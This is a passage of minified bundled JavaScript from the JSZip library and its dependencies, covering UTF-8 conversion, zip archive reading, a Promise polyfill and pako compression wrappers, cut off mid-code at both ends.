Array(256),v=0;v<256;v++)f[v]=252<=v?6:248<=v?5:240<=v?4:224<=v?3:192<=v?2:1;f[254]=f[254]=1;function c(){d.call(this,"utf-8 decode"),this.leftOver=null}function p(){d.call(this,"utf-8 encode")}r.utf8encode=function(h){return a.nodebuffer?n.newBufferFrom(h,"utf-8"):(function(m){var g,y,b,k,x,C=m.length,z=0;for(k=0;k<C;k++)(64512&(y=m.charCodeAt(k)))==55296&&k+1<C&&(64512&(b=m.charCodeAt(k+1)))==56320&&(y=65536+(y-55296<<10)+(b-56320),k++),z+=y<128?1:y<2048?2:y<65536?3:4;for(g=a.uint8array?new Uint8Array(z):new Array(z),k=x=0;x<z;k++)(64512&(y=m.charCodeAt(k)))==55296&&k+1<C&&(64512&(b=m.charCodeAt(k+1)))==56320&&(y=65536+(y-55296<<10)+(b-56320),k++),y<128?g[x++]=y:(y<2048?g[x++]=192|y>>>6:(y<65536?g[x++]=224|y>>>12:(g[x++]=240|y>>>18,g[x++]=128|y>>>12&63),g[x++]=128|y>>>6&63),g[x++]=128|63&y);return g})(h)},r.utf8decode=function(h){return a.nodebuffer?o.transformTo("nodebuffer",h).toString("utf-8"):(function(m){var g,y,b,k,x=m.length,C=new Array(2*x);for(g=y=0;g<x;)if((b=m[g++])<128)C[y++]=b;else if(4<(k=f[b]))C[y++]=65533,g+=k-1;else{for(b&=k===2?31:k===3?15:7;1<k&&g<x;)b=b<<6|63&m[g++],k--;1<k?C[y++]=65533:b<65536?C[y++]=b:(b-=65536,C[y++]=55296|b>>10&1023,C[y++]=56320|1023&b)}return C.length!==y&&(C.subarray?C=C.subarray(0,y):C.length=y),o.applyFromCharCode(C)})(h=o.transformTo(a.uint8array?"uint8array":"array",h))},o.inherits(c,d),c.prototype.processChunk=function(h){var m=o.transformTo(a.uint8array?"uint8array":"array",h.data);if(this.leftOver&&this.leftOver.length){if(a.uint8array){var g=m;(m=new Uint8Array(g.length+this.leftOver.length)).set(this.leftOver,0),m.set(g,this.leftOver.length)}else m=this.leftOver.concat(m);this.leftOver=null}var y=(function(k,x){var C;for((x=x||k.length)>k.length&&(x=k.length),C=x-1;0<=C&&(192&k[C])==128;)C--;return C<0||C===0?x:C+f[k[C]]>x?C:x})(m),b=m;y!==m.length&&(a.uint8array?(b=m.subarray(0,y),this.leftOver=m.subarray(y,m.length)):(b=m.slice(0,y),this.leftOver=m.slice(y,m.length))),this.push({data:r.utf8decode(b),meta:h.meta})},c.prototype.flush=function(){this.leftOver&&this.leftOver.length&&(this.push({data:r.utf8decode(this.leftOver),meta:{}}),this.leftOver=null)},r.Utf8DecodeWorker=c,o.inherits(p,d),p.prototype.processChunk=function(h){this.push({data:r.utf8encode(h.data),meta:h.meta})},r.Utf8EncodeWorker=p},{"./nodejsUtils":14,"./stream/GenericWorker":28,"./support":30,"./utils":32}],32:[function(t,s,r){var o=t("./support"),a=t("./base64"),n=t("./nodejsUtils"),d=t("./external");function f(g){return g}function v(g,y){for(var b=0;b<g.length;++b)y[b]=255&g.charCodeAt(b);return y}t("setimmediate"),r.newBlob=function(g,y){r.checkSupport("blob");try{return new Blob([g],{type:y})}catch{try{var b=new(self.BlobBuilder||self.WebKitBlobBuilder||self.MozBlobBuilder||self.MSBlobBuilder);return b.append(g),b.getBlob(y)}catch{throw new Error("Bug : can't construct the Blob.")}}};var c={stringifyByChunk:function(g,y,b){var k=[],x=0,C=g.length;if(C<=b)return String.fromCharCode.apply(null,g);for(;x<C;)y==="array"||y==="nodebuffer"?k.push(String.fromCharCode.apply(null,g.slice(x,Math.min(x+b,C)))):k.push(String.fromCharCode.apply(null,g.subarray(x,Math.min(x+b,C)))),x+=b;return k.join("")},stringifyByChar:function(g){for(var y="",b=0;b<g.length;b++)y+=String.fromCharCode(g[b]);return y},applyCanBeUsed:{uint8array:(function(){try{return o.uint8array&&String.fromCharCode.apply(null,new Uint8Array(1)).length===1}catch{return!1}})(),nodebuffer:(function(){try{return o.nodebuffer&&String.fromCharCode.apply(null,n.allocBuffer(1)).length===1}catch{return!1}})()}};function p(g){var y=65536,b=r.getTypeOf(g),k=!0;if(b==="uint8array"?k=c.applyCanBeUsed.uint8array:b==="nodebuffer"&&(k=c.applyCanBeUsed.nodebuffer),k)for(;1<y;)try{return c.stringifyByChunk(g,b,y)}catch{y=Math.floor(y/2)}return c.stringifyByChar(g)}function h(g,y){for(var b=0;b<g.length;b++)y[b]=g[b];return y}r.applyFromCharCode=p;var m={};m.string={string:f,array:function(g){return v(g,new Array(g.length))},arraybuffer:function(g){return m.string.uint8array(g).buffer},uint8array:function(g){return v(g,new Uint8Array(g.length))},nodebuffer:function(g){return v(g,n.allocBuffer(g.length))}},m.array={string:p,array:f,arraybuffer:function(g){return new Uint8Array(g).buffer},uint8array:function(g){return new Uint8Array(g)},nodebuffer:function(g){return n.newBufferFrom(g)}},m.arraybuffer={string:function(g){return p(new Uint8Array(g))},array:function(g){return h(new Uint8Array(g),new Array(g.byteLength))},arraybuffer:f,uint8array:function(g){return new Uint8Array(g)},nodebuffer:function(g){return n.newBufferFrom(new Uint8Array(g))}},m.uint8array={string:p,array:function(g){return h(g,new Array(g.length))},arraybuffer:function(g){return g.buffer},uint8array:f,nodebuffer:function(g){return n.newBufferFrom(g)}},m.nodebuffer={string:p,array:function(g){return h(g,new Array(g.length))},arraybuffer:function(g){return m.nodebuffer.uint8array(g).buffer},uint8array:function(g){return h(g,new Uint8Array(g.length))},nodebuffer:f},r.transformTo=function(g,y){if(y=y||"",!g)return y;r.checkSupport(g);var b=r.getTypeOf(y);return m[b][g](y)},r.resolve=function(g){for(var y=g.split("/"),b=[],k=0;k<y.length;k++){var x=y[k];x==="."||x===""&&k!==0&&k!==y.length-1||(x===".."?b.pop():b.push(x))}return b.join("/")},r.getTypeOf=function(g){return typeof g=="string"?"string":Object.prototype.toString.call(g)==="[object Array]"?"array":o.nodebuffer&&n.isBuffer(g)?"nodebuffer":o.uint8array&&g instanceof Uint8Array?"uint8array":o.arraybuffer&&g instanceof ArrayBuffer?"arraybuffer":void 0},r.checkSupport=function(g){if(!o[g.toLowerCase()])throw new Error(g+" is not supported by this platform")},r.MAX_VALUE_16BITS=65535,r.MAX_VALUE_32BITS=-1,r.pretty=function(g){var y,b,k="";for(b=0;b<(g||"").length;b++)k+="\\x"+((y=g.charCodeAt(b))<16?"0":"")+y.toString(16).toUpperCase();return k},r.delay=function(g,y,b){setImmediate(function(){g.apply(b||null,y||[])})},r.inherits=function(g,y){function b(){}b.prototype=y.prototype,g.prototype=new b},r.extend=function(){var g,y,b={};for(g=0;g<arguments.length;g++)for(y in arguments[g])Object.prototype.hasOwnProperty.call(arguments[g],y)&&b[y]===void 0&&(b[y]=arguments[g][y]);return b},r.prepareContent=function(g,y,b,k,x){return d.Promise.resolve(y).then(function(C){return o.blob&&(C instanceof Blob||["[object File]","[object Blob]"].indexOf(Object.prototype.toString.call(C))!==-1)&&typeof FileReader<"u"?new d.Promise(function(z,P){var R=new FileReader;R.onload=function(j){z(j.target.result)},R.onerror=function(j){P(j.target.error)},R.readAsArrayBuffer(C)}):C}).then(function(C){var z=r.getTypeOf(C);return z?(z==="arraybuffer"?C=r.transformTo("uint8array",C):z==="string"&&(x?C=a.decode(C):b&&k!==!0&&(C=(function(P){return v(P,o.uint8array?new Uint8Array(P.length):new Array(P.length))})(C))),C):d.Promise.reject(new Error("Can't read the data of '"+g+"'. Is it in a supported JavaScript type (String, Blob, ArrayBuffer, etc) ?"))})}},{"./base64":1,"./external":6,"./nodejsUtils":14,"./support":30,setimmediate:54}],33:[function(t,s,r){var o=t("./reader/readerFor"),a=t("./utils"),n=t("./signature"),d=t("./zipEntry"),f=t("./support");function v(c){this.files=[],this.loadOptions=c}v.prototype={checkSignature:function(c){if(!this.reader.readAndCheckSignature(c)){this.reader.index-=4;var p=this.reader.readString(4);throw new Error("Corrupted zip or bug: unexpected signature ("+a.pretty(p)+", expected "+a.pretty(c)+")")}},isSignature:function(c,p){var h=this.reader.index;this.reader.setIndex(c);var m=this.reader.readString(4)===p;return this.reader.setIndex(h),m},readBlockEndOfCentral:function(){this.diskNumber=this.reader.readInt(2),this.diskWithCentralDirStart=this.reader.readInt(2),this.centralDirRecordsOnThisDisk=this.reader.readInt(2),this.centralDirRecords=this.reader.readInt(2),this.centralDirSize=this.reader.readInt(4),this.centralDirOffset=this.reader.readInt(4),this.zipCommentLength=this.reader.readInt(2);var c=this.reader.readData(this.zipCommentLength),p=f.uint8array?"uint8array":"array",h=a.transformTo(p,c);this.zipComment=this.loadOptions.decodeFileName(h)},readBlockZip64EndOfCentral:function(){this.zip64EndOfCentralSize=this.reader.readInt(8),this.reader.skip(4),this.diskNumber=this.reader.readInt(4),this.diskWithCentralDirStart=this.reader.readInt(4),this.centralDirRecordsOnThisDisk=this.reader.readInt(8),this.centralDirRecords=this.reader.readInt(8),this.centralDirSize=this.reader.readInt(8),this.centralDirOffset=this.reader.readInt(8),this.zip64ExtensibleData={};for(var c,p,h,m=this.zip64EndOfCentralSize-44;0<m;)c=this.reader.readInt(2),p=this.reader.readInt(4),h=this.reader.readData(p),this.zip64ExtensibleData[c]={id:c,length:p,value:h}},readBlockZip64EndOfCentralLocator:function(){if(this.diskWithZip64CentralDirStart=this.reader.readInt(4),this.relativeOffsetEndOfZip64CentralDir=this.reader.readInt(8),this.disksCount=this.reader.readInt(4),1<this.disksCount)throw new Error("Multi-volumes zip are not supported")},readLocalFiles:function(){var c,p;for(c=0;c<this.files.length;c++)p=this.files[c],this.reader.setIndex(p.localHeaderOffset),this.checkSignature(n.LOCAL_FILE_HEADER),p.readLocalPart(this.reader),p.handleUTF8(),p.processAttributes()},readCentralDir:function(){var c;for(this.reader.setIndex(this.centralDirOffset);this.reader.readAndCheckSignature(n.CENTRAL_FILE_HEADER);)(c=new d({zip64:this.zip64},this.loadOptions)).readCentralPart(this.reader),this.files.push(c);if(this.centralDirRecords!==this.files.length&&this.centralDirRecords!==0&&this.files.length===0)throw new Error("Corrupted zip or bug: expected "+this.centralDirRecords+" records in central dir, got "+this.files.length)},readEndOfCentral:function(){var c=this.reader.lastIndexOfSignature(n.CENTRAL_DIRECTORY_END);if(c<0)throw this.isSignature(0,n.LOCAL_FILE_HEADER)?new Error("Corrupted zip: can't find end of central directory"):new Error("Can't find end of central directory : is this a zip file ? If it is, see https://stuk.github.io/jszip/documentation/howto/read_zip.html");this.reader.setIndex(c);var p=c;if(this.checkSignature(n.CENTRAL_DIRECTORY_END),this.readBlockEndOfCentral(),this.diskNumber===a.MAX_VALUE_16BITS||this.diskWithCentralDirStart===a.MAX_VALUE_16BITS||this.centralDirRecordsOnThisDisk===a.MAX_VALUE_16BITS||this.centralDirRecords===a.MAX_VALUE_16BITS||this.centralDirSize===a.MAX_VALUE_32BITS||this.centralDirOffset===a.MAX_VALUE_32BITS){if(this.zip64=!0,(c=this.reader.lastIndexOfSignature(n.ZIP64_CENTRAL_DIRECTORY_LOCATOR))<0)throw new Error("Corrupted zip: can't find the ZIP64 end of central directory locator");if(this.reader.setIndex(c),this.checkSignature(n.ZIP64_CENTRAL_DIRECTORY_LOCATOR),this.readBlockZip64EndOfCentralLocator(),!this.isSignature(this.relativeOffsetEndOfZip64CentralDir,n.ZIP64_CENTRAL_DIRECTORY_END)&&(this.relativeOffsetEndOfZip64CentralDir=this.reader.lastIndexOfSignature(n.ZIP64_CENTRAL_DIRECTORY_END),this.relativeOffsetEndOfZip64CentralDir<0))throw new Error("Corrupted zip: can't find the ZIP64 end of central directory");this.reader.setIndex(this.relativeOffsetEndOfZip64CentralDir),this.checkSignature(n.ZIP64_CENTRAL_DIRECTORY_END),this.readBlockZip64EndOfCentral()}var h=this.centralDirOffset+this.centralDirSize;this.zip64&&(h+=20,h+=12+this.zip64EndOfCentralSize);var m=p-h;if(0<m)this.isSignature(p,n.CENTRAL_FILE_HEADER)||(this.reader.zero=m);else if(m<0)throw new Error("Corrupted zip: missing "+Math.abs(m)+" bytes.")},prepareReader:function(c){this.reader=o(c)},load:function(c){this.prepareReader(c),this.readEndOfCentral(),this.readCentralDir(),this.readLocalFiles()}},s.exports=v},{"./reader/readerFor":22,"./signature":23,"./support":30,"./utils":32,"./zipEntry":34}],34:[function(t,s,r){var o=t("./reader/readerFor"),a=t("./utils"),n=t("./compressedObject"),d=t("./crc32"),f=t("./utf8"),v=t("./compressions"),c=t("./support");function p(h,m){this.options=h,this.loadOptions=m}p.prototype={isEncrypted:function(){return(1&this.bitFlag)==1},useUTF8:function(){return(2048&this.bitFlag)==2048},readLocalPart:function(h){var m,g;if(h.skip(22),this.fileNameLength=h.readInt(2),g=h.readInt(2),this.fileName=h.readData(this.fileNameLength),h.skip(g),this.compressedSize===-1||this.uncompressedSize===-1)throw new Error("Bug or corrupted zip : didn't get enough information from the central directory (compressedSize === -1 || uncompressedSize === -1)");if((m=(function(y){for(var b in v)if(Object.prototype.hasOwnProperty.call(v,b)&&v[b].magic===y)return v[b];return null})(this.compressionMethod))===null)throw new Error("Corrupted zip : compression "+a.pretty(this.compressionMethod)+" unknown (inner file : "+a.transformTo("string",this.fileName)+")");this.decompressed=new n(this.compressedSize,this.uncompressedSize,this.crc32,m,h.readData(this.compressedSize))},readCentralPart:function(h){this.versionMadeBy=h.readInt(2),h.skip(2),this.bitFlag=h.readInt(2),this.compressionMethod=h.readString(2),this.date=h.readDate(),this.crc32=h.readInt(4),this.compressedSize=h.readInt(4),this.uncompressedSize=h.readInt(4);var m=h.readInt(2);if(this.extraFieldsLength=h.readInt(2),this.fileCommentLength=h.readInt(2),this.diskNumberStart=h.readInt(2),this.internalFileAttributes=h.readInt(2),this.externalFileAttributes=h.readInt(4),this.localHeaderOffset=h.readInt(4),this.isEncrypted())throw new Error("Encrypted zip are not supported");h.skip(m),this.readExtraFields(h),this.parseZIP64ExtraField(h),this.fileComment=h.readData(this.fileCommentLength)},processAttributes:function(){this.unixPermissions=null,this.dosPermissions=null;var h=this.versionMadeBy>>8;this.dir=!!(16&this.externalFileAttributes),h==0&&(this.dosPermissions=63&this.externalFileAttributes),h==3&&(this.unixPermissions=this.externalFileAttributes>>16&65535),this.dir||this.fileNameStr.slice(-1)!=="/"||(this.dir=!0)},parseZIP64ExtraField:function(){if(this.extraFields[1]){var h=o(this.extraFields[1].value);this.uncompressedSize===a.MAX_VALUE_32BITS&&(this.uncompressedSize=h.readInt(8)),this.compressedSize===a.MAX_VALUE_32BITS&&(this.compressedSize=h.readInt(8)),this.localHeaderOffset===a.MAX_VALUE_32BITS&&(this.localHeaderOffset=h.readInt(8)),this.diskNumberStart===a.MAX_VALUE_32BITS&&(this.diskNumberStart=h.readInt(4))}},readExtraFields:function(h){var m,g,y,b=h.index+this.extraFieldsLength;for(this.extraFields||(this.extraFields={});h.index+4<b;)m=h.readInt(2),g=h.readInt(2),y=h.readData(g),this.extraFields[m]={id:m,length:g,value:y};h.setIndex(b)},handleUTF8:function(){var h=c.uint8array?"uint8array":"array";if(this.useUTF8())this.fileNameStr=f.utf8decode(this.fileName),this.fileCommentStr=f.utf8decode(this.fileComment);else{var m=this.findExtraFieldUnicodePath();if(m!==null)this.fileNameStr=m;else{var g=a.transformTo(h,this.fileName);this.fileNameStr=this.loadOptions.decodeFileName(g)}var y=this.findExtraFieldUnicodeComment();if(y!==null)this.fileCommentStr=y;else{var b=a.transformTo(h,this.fileComment);this.fileCommentStr=this.loadOptions.decodeFileName(b)}}},findExtraFieldUnicodePath:function(){var h=this.extraFields[28789];if(h){var m=o(h.value);return m.readInt(1)!==1||d(this.fileName)!==m.readInt(4)?null:f.utf8decode(m.readData(h.length-5))}return null},findExtraFieldUnicodeComment:function(){var h=this.extraFields[25461];if(h){var m=o(h.value);return m.readInt(1)!==1||d(this.fileComment)!==m.readInt(4)?null:f.utf8decode(m.readData(h.length-5))}return null}},s.exports=p},{"./compressedObject":2,"./compressions":3,"./crc32":4,"./reader/readerFor":22,"./support":30,"./utf8":31,"./utils":32}],35:[function(t,s,r){function o(m,g,y){this.name=m,this.dir=y.dir,this.date=y.date,this.comment=y.comment,this.unixPermissions=y.unixPermissions,this.dosPermissions=y.dosPermissions,this._data=g,this._dataBinary=y.binary,this.options={compression:y.compression,compressionOptions:y.compressionOptions}}var a=t("./stream/StreamHelper"),n=t("./stream/DataWorker"),d=t("./utf8"),f=t("./compressedObject"),v=t("./stream/GenericWorker");o.prototype={internalStream:function(m){var g=null,y="string";try{if(!m)throw new Error("No output type specified.");var b=(y=m.toLowerCase())==="string"||y==="text";y!=="binarystring"&&y!=="text"||(y="string"),g=this._decompressWorker();var k=!this._dataBinary;k&&!b&&(g=g.pipe(new d.Utf8EncodeWorker)),!k&&b&&(g=g.pipe(new d.Utf8DecodeWorker))}catch(x){(g=new v("error")).error(x)}return new a(g,y,"")},async:function(m,g){return this.internalStream(m).accumulate(g)},nodeStream:function(m,g){return this.internalStream(m||"nodebuffer").toNodejsStream(g)},_compressWorker:function(m,g){if(this._data instanceof f&&this._data.compression.magic===m.magic)return this._data.getCompressedWorker();var y=this._decompressWorker();return this._dataBinary||(y=y.pipe(new d.Utf8EncodeWorker)),f.createWorkerFrom(y,m,g)},_decompressWorker:function(){return this._data instanceof f?this._data.getContentWorker():this._data instanceof v?this._data:new n(this._data)}};for(var c=["asText","asBinary","asNodeBuffer","asUint8Array","asArrayBuffer"],p=function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},h=0;h<c.length;h++)o.prototype[c[h]]=p;s.exports=o},{"./compressedObject":2,"./stream/DataWorker":27,"./stream/GenericWorker":28,"./stream/StreamHelper":29,"./utf8":31}],36:[function(t,s,r){(function(o){var a,n,d=o.MutationObserver||o.WebKitMutationObserver;if(d){var f=0,v=new d(m),c=o.document.createTextNode("");v.observe(c,{characterData:!0}),a=function(){c.data=f=++f%2}}else if(o.setImmediate||o.MessageChannel===void 0)a="document"in o&&"onreadystatechange"in o.document.createElement("script")?function(){var g=o.document.createElement("script");g.onreadystatechange=function(){m(),g.onreadystatechange=null,g.parentNode.removeChild(g),g=null},o.document.documentElement.appendChild(g)}:function(){setTimeout(m,0)};else{var p=new o.MessageChannel;p.port1.onmessage=m,a=function(){p.port2.postMessage(0)}}var h=[];function m(){var g,y;n=!0;for(var b=h.length;b;){for(y=h,h=[],g=-1;++g<b;)y[g]();b=h.length}n=!1}s.exports=function(g){h.push(g)!==1||n||a()}}).call(this,typeof At<"u"?At:typeof self<"u"?self:typeof window<"u"?window:{})},{}],37:[function(t,s,r){var o=t("immediate");function a(){}var n={},d=["REJECTED"],f=["FULFILLED"],v=["PENDING"];function c(b){if(typeof b!="function")throw new TypeError("resolver must be a function");this.state=v,this.queue=[],this.outcome=void 0,b!==a&&g(this,b)}function p(b,k,x){this.promise=b,typeof k=="function"&&(this.onFulfilled=k,this.callFulfilled=this.otherCallFulfilled),typeof x=="function"&&(this.onRejected=x,this.callRejected=this.otherCallRejected)}function h(b,k,x){o(function(){var C;try{C=k(x)}catch(z){return n.reject(b,z)}C===b?n.reject(b,new TypeError("Cannot resolve promise with itself")):n.resolve(b,C)})}function m(b){var k=b&&b.then;if(b&&(typeof b=="object"||typeof b=="function")&&typeof k=="function")return function(){k.apply(b,arguments)}}function g(b,k){var x=!1;function C(R){x||(x=!0,n.reject(b,R))}function z(R){x||(x=!0,n.resolve(b,R))}var P=y(function(){k(z,C)});P.status==="error"&&C(P.value)}function y(b,k){var x={};try{x.value=b(k),x.status="success"}catch(C){x.status="error",x.value=C}return x}(s.exports=c).prototype.finally=function(b){if(typeof b!="function")return this;var k=this.constructor;return this.then(function(x){return k.resolve(b()).then(function(){return x})},function(x){return k.resolve(b()).then(function(){throw x})})},c.prototype.catch=function(b){return this.then(null,b)},c.prototype.then=function(b,k){if(typeof b!="function"&&this.state===f||typeof k!="function"&&this.state===d)return this;var x=new this.constructor(a);return this.state!==v?h(x,this.state===f?b:k,this.outcome):this.queue.push(new p(x,b,k)),x},p.prototype.callFulfilled=function(b){n.resolve(this.promise,b)},p.prototype.otherCallFulfilled=function(b){h(this.promise,this.onFulfilled,b)},p.prototype.callRejected=function(b){n.reject(this.promise,b)},p.prototype.otherCallRejected=function(b){h(this.promise,this.onRejected,b)},n.resolve=function(b,k){var x=y(m,k);if(x.status==="error")return n.reject(b,x.value);var C=x.value;if(C)g(b,C);else{b.state=f,b.outcome=k;for(var z=-1,P=b.queue.length;++z<P;)b.queue[z].callFulfilled(k)}return b},n.reject=function(b,k){b.state=d,b.outcome=k;for(var x=-1,C=b.queue.length;++x<C;)b.queue[x].callRejected(k);return b},c.resolve=function(b){return b instanceof this?b:n.resolve(new this(a),b)},c.reject=function(b){var k=new this(a);return n.reject(k,b)},c.all=function(b){var k=this;if(Object.prototype.toString.call(b)!=="[object Array]")return this.reject(new TypeError("must be an array"));var x=b.length,C=!1;if(!x)return this.resolve([]);for(var z=new Array(x),P=0,R=-1,j=new this(a);++R<x;)M(b[R],R);return j;function M(D,Y){k.resolve(D).then(function(E){z[Y]=E,++P!==x||C||(C=!0,n.resolve(j,z))},function(E){C||(C=!0,n.reject(j,E))})}},c.race=function(b){var k=this;if(Object.prototype.toString.call(b)!=="[object Array]")return this.reject(new TypeError("must be an array"));var x=b.length,C=!1;if(!x)return this.resolve([]);for(var z=-1,P=new this(a);++z<x;)R=b[z],k.resolve(R).then(function(j){C||(C=!0,n.resolve(P,j))},function(j){C||(C=!0,n.reject(P,j))});var R;return P}},{immediate:36}],38:[function(t,s,r){var o={};(0,t("./lib/utils/common").assign)(o,t("./lib/deflate"),t("./lib/inflate"),t("./lib/zlib/constants")),s.exports=o},{"./lib/deflate":39,"./lib/inflate":40,"./lib/utils/common":41,"./lib/zlib/constants":44}],39:[function(t,s,r){var o=t("./zlib/deflate"),a=t("./utils/common"),n=t("./utils/strings"),d=t("./zlib/messages"),f=t("./zlib/zstream"),v=Object.prototype.toString,c=0,p=-1,h=0,m=8;function g(b){if(!(this instanceof g))return new g(b);this.options=a.assign({level:p,method:m,chunkSize:16384,windowBits:15,memLevel:8,strategy:h,to:""},b||{});var k=this.options;k.raw&&0<k.windowBits?k.windowBits=-k.windowBits:k.gzip&&0<k.windowBits&&k.windowBits<16&&(k.windowBits+=16),this.err=0,this.msg="",this.ended=!1,this.chunks=[],this.strm=new f,this.strm.avail_out=0;var x=o.deflateInit2(this.strm,k.level,k.method,k.windowBits,k.memLevel,k.strategy);if(x!==c)throw new Error(d[x]);if(k.header&&o.deflateSetHeader(this.strm,k.header),k.dictionary){var C;if(C=typeof k.dictionary=="string"?n.string2buf(k.dictionary):v.call(k.dictionary)==="[object ArrayBuffer]"?new Uint8Array(k.dictionary):k.dictionary,(x=o.deflateSetDictionary(this.strm,C))!==c)throw new Error(d[x]);this._dict_set=!0}}function y(b,k){var x=new g(k);if(x.push(b,!0),x.err)throw x.msg||d[x.err];return x.result}g.prototype.push=function(b,k){var x,C,z=this.strm,P=this.options.chunkSize;if(this.ended)return!1;C=k===~~k?k:k===!0?4:0,typeof b=="string"?z.input=n.string2buf(b):v.call(b)==="[object ArrayBuffer]"?z.input=new Uint8Array(b):z.input=b,z.next_in=0,z.avail_in=z.input.length;do{if(z.avail_out===0&&(z.output=new a.Buf8(P),z.next_out=0,z.avail_out=P),(x=o.deflate(z,C))!==1&&x!==c)return this.onEnd(x),!(this.ended=!0);z.avail_out!==0&&(z.avail_in!==0||C!==4&&C!==2)||(this.options.to==="string"?this.onData(n.buf2binstring(a.shrinkBuf(z.output,z.next_out))):this.onData(a.shrinkBuf(z.output,z.next_out)))}while((0<z.avail_in||z.avail_out===0)&&x!==1);return C===4?(x=o.deflateEnd(this.strm),this.onEnd(x),this.ended=!0,x===c):C!==2||(this.onEnd(c),!(z.avail_out=0))},g.prototype.onData=function(b){this.chunks.push(b)},g.prototype.onEnd=function(b){b===c&&(this.options.to==="string"?this.result=this.chunks.join(""):this.result=a.flattenChunks(this.chunks)),this.chunks=[],this.err=b,this.msg=this.strm.msg},r.Deflate=g,r.deflate=y,r.deflateRaw=function(b,k){return(k=k||{}).raw=!0,y(b,k)},r.gzip=function(b,k){return(k=k||{}).gzip=!0,y(b,k)}},{"./utils/common":41,"./utils/strings":42,"./zlib/deflate":46,"./zlib/messages":51,"./zlib/zstream":53}],40:[function(t,s,r){var o=t("./zlib/inflate"),a=t("./utils/common"),n=t("./utils/strings"),d=t("./zlib/constants"),f=t("./zlib/messages"),v=t("./zlib/zstream"),c=t("./zlib/gzheader"),p=Object.prototype.toString;function h(g){if(!(this instanceof h))return new h(g);this.options=a.assign({chunkSize:16384,windowBits:0,to:""},g||{});var y=this.options;y.raw&&0<=y.windowBits&&y.windowBits<16&&(y.windowBits=-y.windowBits,y.windowBits===0&&(y.windowBits=-15)),!(0<=y.windowBits&&y.windowBits<16)||g&&g.windowBits||(y.windowBits+=32),15<y.windowBits&&y.windowBits<48&&(15&y.windowBits)==0&&(y.windowBits|=15),this.err=0,this.msg="",this.ended=!1,this.chunks=[],this.strm=new v,this.strm.avail_out=0;var b=o.inflateInit2(this.strm,y.windowBits);if(b!==d.Z_OK)throw new Error(f[b]);this.header=new c,o.inflateGetHeader(this.strm,this.header)}function m(g,y){var b=new h(y);if(b.push(g,!0),b.err)throw b.msg||f[b.err];return b.result}h.prototype.push=function(g,y){var b,k,x,C,z,P,R=this.strm,j=this.options.chunkSize,M=this.options.dictionary,D=!1;if(this.ended)return!1;k=y===~~y?y:y===!0?d.Z_FINISH:d.Z_NO_FLUSH,typeof g=="string"?R.input=n.binstring2buf(g):p.call(g)==="[object ArrayBuffer]"?R.input=new Uint8Array(g):R.input=g,R.next_in=0,R.avail_in=R.input.length;do{if(R.avail_out===0&&(R.output=new a.Buf8(j),R.next_out=0,R.avail_out=j),(b=o.inflate(R,d.Z_NO_FLUSH))===d.Z_NEED_DICT&&M&&(P=typeof M=="string"?n.string2buf(M):p.call(M)==="[object ArrayBuffer]"?new Uint8Array(M):M,b=o.inflateSetDictionary(this.strm,P)),b===d.Z_BUF_ERROR&&D===!0&&(b=d.Z_OK,D=!1),b!==d.Z_STREAM_END&&b!==d.Z_OK)return this.onEnd(b),!(this.ended=!0);R.next_out&&(R.avail_out!==0&&b!==d.Z_STREAM_END&&(R.avail_in!==0||k!==d.Z_FINISH&&k!==d.Z_SYNC_FLUSH)||(this.options.to==="string"?(x=n.utf8border(R.output,R.next_out),C=R.next_out-x,z=n.buf2string(R.output,x),R.next_out=C,R.avail_out=j-C,C&&a.arraySet(R.output,R.output,x,C,0),this.onData(z)):this.onData(a.shrinkBuf(R.output,R.next_out)))),R.avail_in===0&&R.avail_out===0&&(D=!0)}while((0<R.avail_in||R.avail_out===0)&&b!==d.Z_STREAM_END);return b===d.Z_STREAM_END&&(k=d.Z_FINISH),k===d.Z_FINISH?(b=o.inflateEnd(this.strm),this.onEnd(b),this.ended=!0,b===d.Z_OK):k!==d.Z_SYNC_FLUSH||(this.onEnd(d.Z_OK),!(R.avail_out=0))},h.prototype.onData=function(g){this.chunks.push(g)},h.prototype.onEnd=function(g){g===d.Z_OK&&(this.options.to==="string"?this.result=this.chunks.join(""):this.result=a.flattenChunks(this.chunks)),this.chunks=[],this.err=g,this.msg=this.strm.msg},r.Inflate=h,r.inflate=m,r.inflateRaw=function(g,y){return(y=y||{}).raw=!0,m(g,y)},r.ungzip=m},{"./utils/common":41,"./utils/strings":42,"./zlib/constants":44,"./zlib/gzheader":47,"./zlib/inflate":49,"./zlib/messages":51,"./zlib/zstream":53}],41:[function(t,s,r){var o=typeof Uint8Array<"u"&&typeof Uint16Array<"u"&&typeof Int32Array<"u";r.assign=function(d){for(var f=Array.prototype.slice.call(arguments,1);f.length;){var v=f.shift();if(v){if(typeof v!="object")throw new TypeError(v+"must be non-object");for(var c in v)v.hasOwnProperty(c)&&(d[c]=v[c])}}return d},r.shrinkBuf=function(d,f){return d.length===f?d:d.subarray?d.subarray(0,f):(d.length=f,d)};var a={arraySet:function(d,f,v,c,p){if(f.subarray&&d.subarray)d.set(f.subarray(v,v+c),p);else for(var h=0;h<c;h++)d[p+h]=f[v+h]},flattenChunks:function(d){var f,v,c,p,h,m;for(f=c=0,v=d.length;f<v;f++)c+=d[f].length;for(m=new Uint8Array(c),f=p=0,v=d.length;f<v;f++)h=d[f],m.set(h,p),p+=h.length;return m}},n={arraySet:function(d,f,v,c,p){for(var h=0;h<c;h++)d[p+h]=f[v+h]},flattenChunks:function(d){return[].concat.apply([],d)}};r.setTyped=function(d){d?(r.Buf8=Uint8Array,r.Buf16=Uint16Array,r.Buf32=Int32Array,r.assign(r,a)):(r.Buf8=Array,r.Buf16=Array,r.Buf32=Array,r.assign(r,n))},r.setTyped(o)},{}],42:[function(t,s,r){var o=t("./common"),a=!0,n=!0;try{String.fromCharCode.apply(null,[0])}catch{a=!1}try{String.fromCharCode.apply(null,new Uint8Array(1))}catch{n=!1}for(var d=new o.Buf8(256),f=0;f<256;f++)d[f]=252<=f?6:248<=f?5:240<=f?4:224<=f?3:192<=f?2:1;function v(c,p){if(p<65537&&(c.subarray&&n||!c.subarray&&a))return String.fromCharCode.apply(null,o.shrinkBuf(c,p));for(var h="",m=0;m<p;m++)h+=String.fromCharCode(c[m]);return h}d[254]=d[254]=1,r.string2buf=function(c){var p,h,m,g,y,b=c.length,k=0;for(g=0;g<b;g++)(64512&(h=c.charCodeAt(g)))==55296&&g+1<b&&(64512&(m=c.charCodeAt(g+1)))==56320&&(h=65536+(h-55296<<10)+(m-56320),g++),k+=h<128?1:h<2048?2:h<65536?3:4;for(p=new 